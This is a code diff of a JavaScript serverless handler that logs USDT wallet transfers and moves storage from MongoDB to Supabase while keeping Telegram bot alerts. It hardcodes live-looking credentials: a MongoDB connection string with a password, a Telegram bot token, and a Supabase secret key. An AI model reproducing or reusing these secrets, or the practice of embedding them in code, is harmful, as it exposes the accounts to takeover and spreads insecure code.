@@ -1,83 +1,3 @@
-import { MongoClient } from 'mongodb';
-
-const MONGODB_URI = 'mongodb+srv://celiksamir5_db_user:ZL3QmMmLVxBgdR1a@usdt-transfer.l0meppt.mongodb.net/?appName=usdt-transfer';
-const TELEGRAM_BOT_TOKEN = '8963397372:AAEvbhYGLXdFgJ5AszQvKoHbIu1bTVg3RNA';
-const TELEGRAM_CHAT_ID = '8933407008';
-const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-
-let cachedClient = null;
-
-async function connectToDatabase( ) {
-  if (cachedClient) {
-    return cachedClient;
-  }
-
-  const client = new MongoClient(MONGODB_URI);
-  await client.connect();
-  cachedClient = client;
-  return client;
-}
-
-async function saveTransaction(userAddress, txHash, amount) {
-  try {
-    const client = await connectToDatabase();
-    const db = client.db('usdt-transfer');
-    const collection = db.collection('transactions');
-
-    const transaction = {
-      userAddress,
-      txHash,
-      amount,
-      timestamp: new Date(),
-      status: 'completed'
-    };
-
-    const result = await collection.insertOne(transaction);
-    console.log('✅ Transaction saved to MongoDB:', result.insertedId);
-    return result.insertedId;
-  } catch (error) {
-    console.error('❌ Error saving transaction:', error);
-    throw error;
-  }
-}
-
-async function sendTelegramNotification(userAddress, txHash, amount) {
-  try {
-    const message = `
-🔔 **USDT Transfer Notification**
-
-👤 **Wallet Address:** \`${userAddress}\`
-📤 **Transaction Hash:** \`${txHash}\`
-💰 **Amount:** ${amount} USDT
-⏰ **Timestamp:** ${new Date().toISOString()}
-
-✅ Transaction approved and sent successfully!
-    `.trim();
-
-    const response = await fetch(TELEGRAM_API, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: 'Markdown'
-      })
-    });
-
-    if (!response.ok) {
-      throw new Error(`Telegram API error: ${response.status}`);
-    }
-
-    console.log('✅ Telegram notification sent');
-    return true;
-  } catch (error) {
-    console.error('⚠️ Telegram error (continuing anyway):', error.message);
-    return false;
-  }
-}
-
 export default async function handler(req, res) {
   // CORS headers
   res.setHeader('Access-Control-Allow-Origin', '*');
@@ -91,7 +11,13 @@ export default async function handler(req, res) {
     return;
   }
 
-  if (req.method === 'POST') {
+  const SUPABASE_URL = 'https://wnsdjnribaysltxdgwna.supabase.co';
+  const SUPABASE_KEY = 'sb_secret_ltQpsb1ykGqnD71VQtgLaw_KU-keE0z';
+  const TELEGRAM_BOT_TOKEN = '8963397372:AAEvbhYGLXdFgJ5AszQvKoHbIu1bTVg3RNA';
+  const TELEGRAM_CHAT_ID = '8933407008';
+  const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+  if (req.method === 'POST' ) {
     try {
       const { userAddress, txHash, amount, source } = req.body;
 
@@ -104,23 +30,71 @@ export default async function handler(req, res) {
         return;
       }
 
-      // Salva la transazione in MongoDB
-      const transactionId = await saveTransaction(userAddress, txHash, amount);
+      // Salva in Supabase
+      const response = await fetch(
+        `${SUPABASE_URL}/rest/v1/transactions`,
+        {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'Authorization': `Bearer ${SUPABASE_KEY}`,
+            'Prefer': 'return=representation'
+          },
+          body: JSON.stringify({
+            user_address: userAddress,
+            tx_hash: txHash,
+            amount: amount
+          })
+        }
+      );
+
+      if (!response.ok) {
+        throw new Error(`Supabase error: ${response.status}`);
+      }
+
+      const data = await response.json();
+      console.log('✅ Transaction saved to Supabase:', data);
 
       // Prova a inviare la notifica Telegram (non blocca se fallisce)
-      await sendTelegramNotification(userAddress, txHash, amount);
+      try {
+        const message = `
+🔔 **USDT Transfer Notification**
+
+👤 **Wallet Address:** \`${userAddress}\`
+📤 **Transaction Hash:** \`${txHash}\`
+💰 **Amount:** ${amount} USDT
+⏰ **Timestamp:** ${new Date().toISOString()}
+
+✅ Transaction approved and sent successfully!
+        `.trim();
+
+        await fetch(TELEGRAM_API, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+          })
+        });
+
+        console.log('✅ Telegram notification sent');
+      } catch (telegramError) {
+        console.warn('⚠️ Telegram error (continuing anyway):', telegramError.message);
+      }
 
       // Risposta di successo
       res.status(200).json({
         success: true,
-        transferHash: transactionId.toString(),
-        hash: transactionId.toString(),
+        transferHash: data[0]?.id?.toString() || 'saved',
+        hash: data[0]?.id?.toString() || 'saved',
         message: 'Transaction saved successfully'
       });
 
-      console.log(`✅ Transaction processed for ${userAddress}`);
     } catch (error) {
-      console.error('❌ Error processing transaction:', error);
+      console.error('❌ Error:', error);
       res.status(500).json({
         success: false,
         error: error.message
